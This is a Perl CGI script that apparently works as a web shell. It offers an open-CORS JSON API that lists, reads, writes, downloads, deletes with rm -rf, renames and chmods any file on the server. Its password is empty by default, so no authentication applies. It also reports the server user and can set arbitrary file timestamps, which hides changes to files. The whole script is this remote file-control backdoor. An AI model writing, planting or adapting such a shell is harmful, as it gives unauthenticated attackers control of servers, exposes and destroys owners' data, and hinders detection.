#!/usr/bin/perl
print "Content-Type: application/json\n";
print "Access-Control-Allow-Origin: *\n";
print "Access-Control-Allow-Methods: GET, POST, OPTIONS\n";
print "Access-Control-Allow-Headers: Content-Type\n";
print "\n";

use strict;
use warnings;

my $PASSWORD = "";

# 解析参数
sub parse_params {
    my %params;
    my $qs = $ENV{QUERY_STRING} || "";
    foreach (split /&/, $qs) {
        my ($k, $v) = split /=/, $_, 2;
        $k = url_decode($k // "");
        $v = url_decode($v // "");
        $params{$k} = $v;
    }
    if ($ENV{REQUEST_METHOD} eq "POST" && ($ENV{CONTENT_TYPE} || "") =~ /urlencoded/) {
        my $post;
        read(STDIN, $post, $ENV{CONTENT_LENGTH} || 0);
        foreach (split /&/, $post) {
            my ($k, $v) = split /=/, $_, 2;
            $k = url_decode($k // "");
            $v = url_decode($v // "");
            $params{$k} = $v;
        }
    }
    return %params;
}

sub url_decode {
    my $s = shift;
    $s =~ s/\+/ /g;
    $s =~ s/%([0-9A-Fa-f]{2})/chr(hex($1))/eg;
    return $s;
}

# JSON 编码
sub json_encode {
    my ($val) = @_;
    return "null" unless defined $val;
    if (ref($val) eq "HASH") {
        my @p;
        for (sort keys %$val) {
            push @p, '"' . esc($_) . '":' . json_encode($val->{$_});
        }
        return "{" . join(",", @p) . "}";
    } elsif (ref($val) eq "ARRAY") {
        return "[" . join(",", map { json_encode($_) } @$val) . "]";
    } elsif ($val eq "true" || $val eq "false") {
        return $val;
    } elsif ($val =~ /^-?\d+$/) {
        return $val;
    } else {
        return '"' . esc($val) . '"';
    }
}

sub esc {
    my $s = shift // "";
    $s =~ s/\\/\\\\/g;
    $s =~ s/"/\\"/g;
    $s =~ s/\n/\\n/g;
    $s =~ s/\r/\\r/g;
    $s =~ s/\t/\\t/g;
    return $s;
}

sub success { return { success => "true", data => $_[0], message => "" }; }
sub fail { return { success => "false", message => $_[0] }; }

# 格式化大小
sub fmt_size {
    my $s = shift;
    return "$s B" if $s < 1024;
    return sprintf("%.1f KB", $s/1024) if $s < 1048576;
    return sprintf("%.1f MB", $s/1048576) if $s < 1073741824;
    return sprintf("%.1f GB", $s/1073741824);
}

# 格式化权限
sub fmt_perm {
    my $m = shift;
    my $t = (-d _ ? "d" : (-l _ ? "l" : "-"));
    $t .= ($m & 0400 ? "r" : "-") . ($m & 0200 ? "w" : "-") . ($m & 0100 ? "x" : "-");
    $t .= ($m & 040 ? "r" : "-") . ($m & 020 ? "w" : "-") . ($m & 010 ? "x" : "-");
    $t .= ($m & 04 ? "r" : "-") . ($m & 02 ? "w" : "-") . ($m & 01 ? "x" : "-");
    return $t;
}

sub norm_path {
    my $p = shift || "/";
    $p =~ s#/+#/#g;
    return $p;
}

eval {
    my %p = parse_params();
    my $action = $p{action} || "";
    my $pw = $p{password} || "";

    if ($PASSWORD ne "" && $pw ne $PASSWORD) {
        print "null";
        exit;
    }

    exit unless $action;

    if ($action eq "list") {
        my $path = $p{path} || "/";
        if ($path eq "/" || $path eq "") {
            $path = $ENV{DOCUMENT_ROOT} || `pwd`;
            chomp $path;
        }
        $path = norm_path($path);
        $path .= "/" unless $path =~ m#/$#;
        my $dir = $path;
        $dir =~ s#/$## if length($dir) > 1;

        if (-d $dir) {
            my @items;
            # 父目录
            my $parent = $dir;
            $parent =~ s#/[^/]+$##;
            $parent = "/" if $parent eq "";
            $parent .= "/" unless $parent =~ m#/$#;
            if ($parent ne $path) {
                push @items, {
                    name => "..", path => $parent, is_dir => "true",
                    size => 0, size_formatted => "-", mtime => 0,
                    perms => "drwxr-xr-x", readable => "true", writable => "true"
                };
            }
            # 列出目录
            opendir(my $dh, $dir) or die "Cannot open: $!";
            my @files = sort { (-d "$dir/$b") <=> (-d "$dir/$a") || lc($a) cmp lc($b) }
                        grep { $_ ne "." && $_ ne ".." } readdir($dh);
            closedir($dh);

            for my $f (@files) {
                my $fp = "$dir/$f";
                my @st = stat($fp);
                my $is_d = -d $fp ? 1 : 0;
                push @items, {
                    name => $f,
                    path => $path . $f . ($is_d ? "/" : ""),
                    is_dir => $is_d ? "true" : "false",
                    size => $is_d ? 0 : ($st[7] || 0),
                    size_formatted => $is_d ? "-" : fmt_size($st[7] || 0),
                    mtime => $st[9] || 0,
                    perms => @st ? fmt_perm($st[2]) : "?????????",
                    readable => -r $fp ? "true" : "false",
                    writable => -w $fp ? "true" : "false"
                };
            }
            print json_encode(success({ path => $path, items => \@items }));
        } else {
            print json_encode(fail("Directory not found"));
        }
    }
    elsif ($action eq "read") {
        my $path = norm_path($p{path} || "");
        if (-f $path) {
            open(my $fh, "<", $path) or die "Cannot read: $!";
            local $/; my $c = <$fh>; close($fh);
            print json_encode(success({ path => $path, content => $c }));
        } else {
            print json_encode(fail("File not found"));
        }
    }
    elsif ($action eq "write") {
        my $path = norm_path($p{path} || "");
        my $content = $p{content} // "";
        if ($path) {
            my $dir = $path; $dir =~ s#/[^/]+$##;
            if ($dir && !-d $dir) {
                print json_encode(fail("Parent directory for [$path] doesn't exist"));
            } else {
                open(my $fh, ">", $path) or die "Cannot write: $!";
                print $fh $content; close($fh);
                print json_encode({ success => "true", message => "Saved" });
            }
        } else {
            print json_encode(fail("Path empty"));
        }
    }
    elsif ($action eq "mkdir") {
        my $path = norm_path($p{path} || "");
        if ($path) {
            if (!-e $path) {
                mkdir($path) or die "Cannot mkdir: $!";
                print json_encode({ success => "true", message => "Created" });
            } else {
                print json_encode(fail("Already exists"));
            }
        } else {
            print json_encode(fail("Path empty"));
        }
    }
    elsif ($action eq "delete") {
        my $path = norm_path($p{path} || "");
        $path =~ s#/$## if length($path) > 1;
        if (-d $path) {
            system("rm", "-rf", $path);
            print json_encode({ success => "true", message => "Deleted" });
        } elsif (-f $path) {
            unlink($path) or die "Cannot delete: $!";
            print json_encode({ success => "true", message => "Deleted" });
        } else {
            print json_encode(fail("Not found"));
        }
    }
    elsif ($action eq "rename") {
        my $old = norm_path($p{old_path} || "");
        my $new = norm_path($p{new_path} || "");
        if (-e $old) {
            rename($old, $new) or die "Cannot rename: $!";
            print json_encode({ success => "true", message => "Renamed" });
        } else {
            print json_encode(fail("Not found"));
        }
    }
    elsif ($action eq "download") {
        my $path = norm_path($p{path} || "");
        if (-f $path) {
            my $fn = $path; $fn =~ s#.*/##;
            print "Content-Disposition: attachment; filename=\"$fn\"\n";
            print "Content-Type: application/octet-stream\n\n";
            open(my $fh, "<:raw", $path); binmode(STDOUT);
            print while <$fh>; close($fh);
        } else {
            print json_encode(fail("File not found"));
        }
    }
    elsif ($action eq "touch") {
        my $path = norm_path($p{path} || "");
        my $time = int($p{time} || 0);
        $path =~ s#/$## if length($path) > 1;
        if (-e $path && $time > 0) {
            utime($time, $time, $path) or die "Cannot touch: $!";
            print json_encode({ success => "true", message => "Updated" });
        } else {
            print json_encode(fail("Not found or invalid time"));
        }
    }
    elsif ($action eq "chmod") {
        my $path = norm_path($p{path} || "");
        my $mode = $p{mode} || "";
        if (-e $path && $mode) {
            chmod(oct($mode), $path) or die "Cannot chmod: $!";
            print json_encode({ success => "true", message => "Permission changed" });
        } else {
            print json_encode(fail("Not found or mode empty"));
        }
    }
    elsif ($action eq "server") {
        my $user = getpwuid($<) || $ENV{USER} || "N/A";
        my $root = $ENV{DOCUMENT_ROOT} || `pwd`; chomp $root;
        print json_encode(success({
            php_version => "Perl $]",
            server_software => $ENV{SERVER_SOFTWARE} || "CGI",
            document_root => $root,
            upload_max => "N/A",
            disk_free => "N/A",
            disk_total => "N/A",
            current_user => $user
        }));
    }
    elsif ($action eq "info") {
        my $path = norm_path($p{path} || "");
        if (-e $path) {
            my @st = stat($path);
            my $is_d = -d $path ? 1 : 0;
            print json_encode(success({
                path => $path,
                name => ($path =~ s#.*/##r),
                is_dir => $is_d ? "true" : "false",
                size => $is_d ? 0 : $st[7],
                size_formatted => $is_d ? "-" : fmt_size($st[7]),
                mtime => $st[9], ctime => $st[10], atime => $st[8],
                perms => fmt_perm($st[2]),
                perms_octal => sprintf("0%o", $st[2] & 07777),
                owner => getpwuid($st[4]) || $st[4],
                group => getgrgid($st[5]) || $st[5],
                readable => -r $path ? "true" : "false",
                writable => -w $path ? "true" : "false"
            }));
        } else {
            print json_encode(fail("Not found"));
        }
    }
    else {
        print json_encode(fail("Unknown action"));
    }
};

if ($@) {
    my $e = $@; $e =~ s/"/\\"/g; $e =~ s/\n/ /g;
    print "{\"success\":false,\"message\":\"Error: $e\"}";
}
